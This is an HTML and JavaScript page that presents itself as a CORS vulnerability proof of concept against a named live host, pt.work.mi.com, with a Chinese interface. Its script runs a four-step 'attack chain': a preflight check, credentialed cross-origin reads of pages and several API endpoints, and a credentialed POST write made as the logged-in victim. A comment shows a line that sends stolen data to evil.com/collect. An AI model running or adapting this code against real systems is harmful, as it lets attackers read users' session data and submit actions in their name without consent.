<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CORS PoC - pt.work.mi.com</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Menlo,Monaco,'Courier New',monospace;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:18px;margin-bottom:8px}
h2{color:#f0883e;font-size:14px;margin:16px 0 8px}
.target{color:#7ee787;font-size:13px;margin-bottom:16px;word-break:break-all}
.log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.log .ok{color:#7ee787}
.log .err{color:#f85149}
.log .info{color:#8b949e}
.log .data{color:#a5d6ff}
.btn{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;margin:8px 4px 0 0}
.btn:hover{background:#2ea043}
.btn.danger{background:#da3633}
.btn.danger:hover{background:#f85149}
</style>
</head>
<body>

<h1>CORS 漏洞验证 PoC</h1>
<div class="target">
目标: <b>https://pt.work.mi.com</b> (小米新零售工作台)<br>
漏洞: Access-Control-Allow-Origin 反射任意域 + Access-Control-Allow-Credentials: true
</div>

<button class="btn" onclick="runFull()">执行完整攻击链</button>
<button class="btn" onclick="step1_options()">Step1: OPTIONS预检</button>
<button class="btn" onclick="step2_get()">Step2: GET带Cookie</button>
<button class="btn" onclick="step3_read()">Step3: 读取页面</button>
<button class="btn danger" onclick="step4_post()">Step4: POST写操作</button>
<div id="log" class="log">等待执行... 点击上方按钮开始测试</div>

<script>
const TARGET = 'https://pt.work.mi.com';
const logEl = document.getElementById('log');

function log(msg, type='') {
    const cls = type ? ` class="${type}"` : '';
    logEl.innerHTML += `<span${cls}>${msg}</span>\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() { logEl.innerHTML = ''; }

async function runFull() {
    clearLog();
    log('═══════════════════════════════════════', 'info');
    log('CORS 漏洞完整攻击链验证', 'info');
    log('攻击页面Origin: ' + window.location.origin, 'info');
    log('目标: ' + TARGET, 'info');
    log('═══════════════════════════════════════\n', 'info');

    await step1_options();
    await new Promise(r => setTimeout(r, 300));
    await step2_get();
    await new Promise(r => setTimeout(r, 300));
    await step3_read();
    await new Promise(r => setTimeout(r, 300));
    await step4_post();

    log('\n═══════════════════════════════════════', 'info');
    log('攻击链执行完毕。若以上步骤全部成功(✓)', 'ok');
    log('则证明 CORS 漏洞 100% 可利用。', 'ok');
    log('═══════════════════════════════════════', 'info');
}

async function step1_options() {
    log('\n[Step 1] 发送 OPTIONS 预检请求...', 'info');
    log('Request: OPTIONS /main-taskcenter-partner', 'info');
    log('Header: Origin: ' + window.location.origin, 'info');
    try {
        const resp = await fetch(TARGET + '/main-taskcenter-partner', {
            method: 'OPTIONS',
            headers: { 'Origin': window.location.origin }
        });
        log(`HTTP ${resp.status}`, 'ok');
        const acao = resp.headers.get('Access-Control-Allow-Origin');
        const acac = resp.headers.get('Access-Control-Allow-Credentials');
        const methods = resp.headers.get('Access-Control-Allow-Methods');
        const headers = resp.headers.get('Access-Control-Allow-Headers');
        const maxAge = resp.headers.get('Access-Control-Max-Age');

        log(`  ACAO: ${acao}`, acao === window.location.origin ? 'ok' : 'err');
        log(`  ACAC: ${acac}`, acac === 'true' ? 'ok' : 'err');
        log(`  Allow-Methods: ${methods}`, 'data');
        log(`  Allow-Headers: ${headers}`, 'data');
        log(`  Max-Age: ${maxAge}s`, 'data');

        if (acao === window.location.origin && acac === 'true') {
            log('  [✓] CORS预检通过! 浏览器允许跨域请求', 'ok');
        } else {
            log('  [✗] CORS预检失败', 'err');
        }
    } catch(e) {
        log(`  [✗] 请求失败: ${e.message}`, 'err');
    }
}

async function step2_get() {
    log('\n[Step 2] 发送 GET 请求 (携带 credentials:include)...', 'info');
    log('Request: GET /main-taskcenter-partner', 'info');
    log('Mode: credentials: include (浏览器会自动携带该域Cookie)', 'info');
    try {
        const resp = await fetch(TARGET + '/main-taskcenter-partner', {
            credentials: 'include'
        });
        log(`HTTP ${resp.status}`, 'ok');
        const acao = resp.headers.get('Access-Control-Allow-Origin');
        const acac = resp.headers.get('Access-Control-Allow-Credentials');
        log(`  ACAO: ${acao}`, acao === window.location.origin ? 'ok' : 'err');
        log(`  ACAC: ${acac}`, acac === 'true' ? 'ok' : 'err');

        // 尝试读取响应体
        const text = await resp.text();
        const titleMatch = text.match(/<title>([^<]*)<\/title>/);
        const title = titleMatch ? titleMatch[1] : '(未找到title)';
        log(`  页面标题: "${title}"`, 'ok');
        log(`  响应大小: ${text.length} 字节`, 'data');
        log('  [✓] 跨域读取页面内容成功!', 'ok');
    } catch(e) {
        log(`  [✗] 请求失败: ${e.message}`, 'err');
    }
}

async function step3_read() {
    log('\n[Step 3] 批量读取多个API端点...', 'info');
    const apis = ['/api', '/api/v1', '/taskcenter', '/partner', '/main-taskcenter-partner'];
    let success = 0;
    for (const api of apis) {
        try {
            const resp = await fetch(TARGET + api, { credentials: 'include' });
            const text = await resp.text();
            const size = text.length;
            const preview = text.substring(0, 80).replace(/\n/g, ' ');
            log(`  ${api} → HTTP ${resp.status} (${size}B) "${preview}..."`, 'ok');
            success++;
        } catch(e) {
            log(`  ${api} → ${e.message}`, 'err');
        }
    }
    log(`  [✓] ${success}/${apis.length} 个端点跨域读取成功`, 'ok');

    // 实际攻击中，攻击者会将窃取的数据发送到自己的服务器:
    // await fetch('https://evil.com/collect', {method:'POST', body: JSON.stringify(stolenData)});
    log('  ⚠ 实际攻击中,此步骤会静默窃取所有API响应并发送至攻击者服务器', 'info');
}

async function step4_post() {
    log('\n[Step 4] 尝试 POST 写操作...', 'info');
    log('Request: POST /api (credentials:include)', 'info');
    log('Body: {"poc":"cors_csrf_attack"}', 'info');
    try {
        const resp = await fetch(TARGET + '/api', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                poc: 'cors_csrf_attack',
                timestamp: new Date().toISOString(),
                origin: window.location.origin
            })
        });
        log(`HTTP ${resp.status}`, 'ok');
        const acao = resp.headers.get('Access-Control-Allow-Origin');
        log(`  ACAO: ${acao}`, acao === window.location.origin ? 'ok' : 'err');

        const text = await resp.text();
        log(`  响应: ${text.substring(0, 200)}`, 'data');
        log('  [✓] POST跨域请求成功 (可读取响应)', 'ok');
        log('  ⚠ 攻击者可利用此漏洞以受害者身份提交任意表单/数据', 'info');
    } catch(e) {
        log(`  [✗] POST失败: ${e.message}`, 'err');
    }
}
</script>
</body>
</html>
